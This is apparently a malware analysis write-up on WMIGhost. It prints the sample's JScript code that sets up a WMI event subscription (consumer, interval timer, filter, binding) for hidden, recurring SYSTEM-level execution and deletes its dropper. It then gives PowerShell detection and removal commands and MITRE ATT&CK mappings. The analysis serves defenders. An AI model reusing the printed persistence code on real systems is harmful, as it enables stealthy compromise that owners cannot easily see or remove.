# Finding 13: WMIGhost - WMI Event Subscription for Stealthy Persistence

## Metadata
- **Repository**: theZoo-master
- **File Path**: `malware/Binaries/WMIGhost/WMIGhost/a3c930f64cbb4e0b259fe6e966ebfb27caa90b540d193e4627b6256962b28864`
- **Language**: JScript/JavaScript (WMI MOF)
- **Technique**: WMI Event Subscription (Related to Scheduled Tasks)
- **Malware Family**: WMIGhost

## Code Snippet

```javascript
// Embedded in larger JScript payload (line 1, minified)
var Asec=oWMI.Get("ActiveScriptEventConsumer").Spawninstance_();
Asec.Name=InstallName+"_consumer";
Asec.ScriptingEngine="jscript";
Asec.ScriptText=codestr;
var Asecpath=Asec.put_();

// *** WMI TIMER INSTRUCTION (Alternative to Scheduled Task) ***
var WMITimer=oWMI.Get("__IntervalTimerInstruction").Spawninstance_();
WMITimer.TimerID=InstallName+"_WMITimer";
WMITimer.IntervalBetweenEvents=InstallRunTimer;  // Repeat interval in milliseconds
WMITimer.SkipIfPassed=false;
WMITimer.put_();

// *** WMI EVENT FILTER ***
var EventFilter=oWMI.Get("__EventFilter").Spawninstance_();
EventFilter.Name=InstallName+"_filter";
EventFilter.Query="select * from __timerevent where timerid=\""+InstallName+"_WMITimer\"";
EventFilter.QueryLanguage="wql";
var FilterPath=EventFilter.put_();

// *** BIND FILTER TO CONSUMER ***
var Binds=oWMI.Get("__FilterToConsumerBinding").Spawninstance_();
Binds.Consumer=Asecpath.path;
Binds.Filter=FilterPath.path;
Binds.put_();

if(ofso.FileExists(scriptfilename)){
    ofso.DeleteFile(scriptfilename);
}
```

## Analysis

**What it does:**
WMIGhost implements a highly stealthy persistence mechanism using WMI Event Subscriptions instead of traditional scheduled tasks. This technique is harder to detect as it doesn't create visible scheduled tasks or registry entries. The malware uses WMI's `__IntervalTimerInstruction` to create timer-based execution, functionally equivalent to scheduled tasks but residing in the WMI repository.

**How it relates to T1053.005 (Scheduled Task/Job):**
While not technically using Task Scheduler, this implements equivalent functionality through WMI:
- **Timer-based execution**: `__IntervalTimerInstruction` creates recurring execution
- **Event-driven**: `__EventFilter` triggers on timer events
- **Code execution**: `ActiveScriptEventConsumer` executes JScript payload
- **Persistence**: Survives reboots as WMI subscriptions persist in repository

**WMI Persistence Architecture:**

**1. ActiveScriptEventConsumer:**
```javascript
Asec = oWMI.Get("ActiveScriptEventConsumer").Spawninstance_()
Asec.Name = InstallName + "_consumer"
Asec.ScriptingEngine = "jscript"
Asec.ScriptText = codestr  // Malicious payload code
```
- Defines WHAT to execute (the JScript payload)
- Runs in WMI service context (often SYSTEM)

**2. __IntervalTimerInstruction:**
```javascript
WMITimer = oWMI.Get("__IntervalTimerInstruction").Spawninstance_()
WMITimer.TimerID = InstallName + "_WMITimer"
WMITimer.IntervalBetweenEvents = InstallRunTimer  // Milliseconds
WMITimer.SkipIfPassed = false
```
- Creates recurring timer (equivalent to scheduled task trigger)
- `IntervalBetweenEvents`: Repeat interval (e.g., 60000 = 1 minute)
- `SkipIfPassed=false`: Ensures event fires even if missed

**3. __EventFilter:**
```javascript
EventFilter = oWMI.Get("__EventFilter").Spawninstance_()
EventFilter.Name = InstallName + "_filter"
EventFilter.Query = "select * from __timerevent where timerid='...'
EventFilter.QueryLanguage = "wql"
```
- Defines WHEN to execute (timer trigger condition)
- WQL query monitors for timer events

**4. __FilterToConsumerBinding:**
```javascript
Binds = oWMI.Get("__FilterToConsumerBinding").Spawninstance_()
Binds.Consumer = Asecpath.path    // Link to consumer
Binds.Filter = FilterPath.path     // Link to filter
```
- Binds the filter (WHEN) to the consumer (WHAT)
- Completes the persistence mechanism

**Evasion/Stealth Techniques:**

1. **No Scheduled Task visibility:**
   - Doesn't appear in Task Scheduler GUI
   - Not visible via `schtasks /query`
   - Requires WMI queries to detect

2. **WMI Repository storage:**
   - Stored in `C:\Windows\System32\wbem\Repository\`
   - Binary storage format (OBJECTS.DATA)
   - Not easily searchable by standard tools

3. **SYSTEM-level execution:**
   - WMI service runs as SYSTEM
   - No UAC prompts
   - High privileges by default

4. **Fileless execution:**
   - JScript code stored in WMI subscription
   - No executable on disk (after initial dropper)
   - In-memory execution via scrcons.exe

5. **Cleanup:**
   - Deletes dropper script after installation
   - Only WMI subscriptions remain

6. **Dynamic naming:**
   - Uses `InstallName` variable for unique identifiers
   - Avoids hardcoded names that could be signature-detected

**Comparison: WMI vs Scheduled Tasks**

| Feature | Scheduled Tasks | WMI Event Subscriptions |
|---------|----------------|------------------------|
| Visibility | Task Scheduler GUI | Hidden in WMI repo |
| Storage | XML files in System32\Tasks | WMI Repository (binary) |
| Detection | schtasks /query | WMI queries required |
| Execution Context | User/SYSTEM | Usually SYSTEM |
| Tools | Built-in GUI | WMI command-line only |
| Common Usage | Very common | Rare (mostly malware) |
| Forensics | Easy to find | Harder to detect |

**Detection Methods:**

**PowerShell Detection:**
```powershell
# List all WMI Event Consumers
Get-WmiObject -Namespace root\subscription -Class __EventConsumer

# List all Event Filters
Get-WmiObject -Namespace root\subscription -Class __EventFilter

# List all Filter-to-Consumer Bindings
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

**Autoruns Detection:**
- Sysinternals Autoruns includes "WMI" tab
- Shows WMI Event subscriptions

**Event Logs:**
- Event ID 5861: WMI permanent event consumer registration
- Event ID 5859: WMI event filter registration

**Known APT Usage:**
WMI Event Subscriptions have been observed in:
- **APT29 (Cozy Bear)**: PowerShell-based WMI persistence
- **APT33**: WMI for payload execution
- **Turla**: WMI for C2 communication
- **Cobalt Strike**: Built-in WMI persistence module

**Real-World Context:**
WMIGhost demonstrates advanced persistence techniques:
- Harder to detect than scheduled tasks
- Survives most cleanup tools
- Often overlooked by incident responders
- Requires specialized knowledge to identify and remove

**Removal Complexity:**
```powershell
# Manual removal requires multiple steps:
$consumer = Get-WmiObject -Namespace root\subscription -Class __EventConsumer | Where-Object {$_.Name -like "*_consumer"}
$filter = Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -like "*_filter"}
$binding = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -eq $filter.__RELPATH}

$binding.Delete()
$consumer.Delete()
$filter.Delete()
```

**MITRE ATT&CK Mapping:**
- **T1546.003**: Event Triggered Execution: Windows Management Instrumentation Event Subscription (Primary)
- **T1053.005**: Scheduled Task/Job: Scheduled Task (Functional equivalent)
- **T1047**: Windows Management Instrumentation (WMI)
- **T1059.007**: Command and Scripting Interpreter: JavaScript (JScript payload)
- **T1027**: Obfuscated Files or Information (minified JavaScript)
- **T1070.004**: Indicator Removal on Host: File Deletion (dropper cleanup)
- **T1564.004**: Hide Artifacts: NTFS File Attributes (WMI repo storage)

**Note on Classification:**
While WMI Event Subscriptions are technically separate from Scheduled Tasks, they're included in this analysis because:
1. They achieve the same goal: scheduled/recurring execution
2. Often used as alternative to scheduled tasks for stealth
3. MITRE groups them under similar persistence categories
4. Security teams should monitor both mechanisms together
